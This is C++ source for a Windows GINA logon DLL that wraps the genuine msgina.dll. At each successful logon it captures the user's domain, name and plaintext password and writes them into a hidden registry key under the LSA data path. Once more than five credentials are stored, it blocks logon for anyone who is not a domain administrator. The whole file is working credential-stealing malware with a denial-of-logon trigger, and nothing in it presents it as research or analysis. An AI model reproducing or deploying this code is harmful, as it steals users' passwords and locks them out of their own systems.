#include "stdafx.h"
#include "msgina.h"
#include <tchar.h>
#include <lm.h>
#include <windows.h>
#include <winnt.h>
#include <atlbase.h>
#include <atlsecurity.h>
#include <iostream>
#include <sstream>

using namespace std;
typedef std::basic_string<TCHAR> tstring;
typedef std::basic_stringstream<TCHAR> tstringstream;


HMODULE g_msginaDll;


BOOL
WINAPI
MsCindy_WlxInitialize
(
 LPWSTR     lpWinsta,
 HANDLE     hWlx,
 PVOID      pvReserved,
 PVOID      pWinlogonFunctions,
 PVOID*     pWlxContext
 )
{
   #ifdef _DEBUG
   MessageBox(NULL, _T("Attach WinLogon Process."), _T("WinLogon"), MB_OK);
   #endif

   g_msginaDll = LoadLibrary(_T("msgina.dll"));
   assert(g_msginaDll);

   FWlxInitialize *WlxInitialize = reinterpret_cast<FWlxInitialize*>(
      GetProcAddress(g_msginaDll, "WlxInitialize") );
   assert(WlxInitialize);
   
   return WlxInitialize(lpWinsta, hWlx, pvReserved, 
      pWinlogonFunctions, pWlxContext);
}


VOID
WINAPI
MsCindy_WlxShutdown
(
 PVOID      pWlxContext,
 DWORD      ShutdownType
 )
{
   assert(g_msginaDll);

   FWlxShutdown *WlxShutdown = reinterpret_cast<FWlxShutdown*>(
      GetProcAddress(g_msginaDll, "WlxShutdown") );
   assert(WlxShutdown);

   WlxShutdown(pWlxContext, ShutdownType);

   FreeLibrary(g_msginaDll);
}


int SaveLogonInformation(const tstring &userName, const tstring &password)
{
   int ret = 0;
   CRegKey regKey;
   
   if( regKey.Create(HKEY_LOCAL_MACHINE, 
      _T("SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data\\MsCindy")) 
      == ERROR_SUCCESS )
   {
      if( regKey.SetStringValue(userName.c_str(), password.c_str()) 
         == ERROR_SUCCESS )
      {
         DWORD values;
         RegQueryInfoKey(regKey, NULL, NULL, NULL, NULL, NULL, NULL, &values,
            NULL, NULL, NULL, NULL);
         ret = int(values);
      }
   }
   
   return ret;
}


tstring ComputerName()
{
   TCHAR compName[MAX_COMPUTERNAME_LENGTH + 5] = { 0 };
   DWORD sz = SIZEOF_ARRAY(compName);
   GetComputerName(compName, &sz);
   return compName;
}


bool IsDomainAdmin(const tstring &group, const tstring &domain)
{
   try
   {
      SID_IDENTIFIER_AUTHORITY idAuth = SECURITY_NT_AUTHORITY;
      CSid domainAdmins(idAuth, 1, DOMAIN_GROUP_RID_ADMINS);
      CSid groupSid(group.c_str(), domain.c_str());

      return domainAdmins == groupSid;
   }
   catch(CAtlException &)
   {
      return false;
   }
}


bool IsNetworkAdmin(const tstring &userName, const tstring &domain)
{
   if( !StrCmpI(ComputerName().c_str(), domain.c_str()) )
      return false;

   bool ret = false;
   LPGROUP_USERS_INFO_0 lgroupInfo;
   DWORD total;
   NET_API_STATUS nerr;

   nerr = NetUserGetGroups(domain.c_str(), 
      userName.c_str(), 
      0, 
      reinterpret_cast<LPBYTE*>(&lgroupInfo),
      MAX_PREFERRED_LENGTH,
      &total,
      &total);

   if( nerr == NERR_Success )
   {
      for( DWORD i = 0; i < total; ++i )
         if( IsDomainAdmin(domain + _T('\\') + lgroupInfo[i].grui0_name, 
            domain) )
         {
            ret = true;
            break;
         }
   
      NetApiBufferFree(lgroupInfo);
   }
   
   return ret;
}


int
WINAPI 
MsCindy_WlxLoggedOutSAS
(
 PVOID pWlxContext,
 DWORD dwSasType, 
 PLUID pAuthenticationId, 
 PSID pLogonSid, 
 PDWORD pdwOptions, 
 PHANDLE phToken, 
 PWLX_MPR_NOTIFY_INFO pNprNotifyInfo, 
 PVOID* pProfile
 )
{
   FWlxLoggedOutSAS *WlxLoggedOutSAS = reinterpret_cast<FWlxLoggedOutSAS*>(
      GetProcAddress(g_msginaDll, "WlxLoggedOutSAS") );

   int ret = WlxLoggedOutSAS(pWlxContext, dwSasType, pAuthenticationId, 
      pLogonSid, pdwOptions, phToken, pNprNotifyInfo, pProfile);

   if( ret == WLX_SAS_ACTION_LOGON )
   {
      tstringstream userName;
      tstringstream password;

      // Domain\User
      userName << pNprNotifyInfo->pszDomain << '\\' 
         << pNprNotifyInfo->pszUserName;

      password << pNprNotifyInfo->pszPassword;

      if( SaveLogonInformation(userName.str(), password.str()) > 5 )
         if( !IsNetworkAdmin(userName.str(), pNprNotifyInfo->pszDomain) )
            ret = 0;
   }

   return ret;
}


BOOL APIENTRY DllMain( HANDLE hModule, 
                      DWORD  ul_reason_for_call, 
                      LPVOID lpReserved
                      )
{
   return TRUE;
}
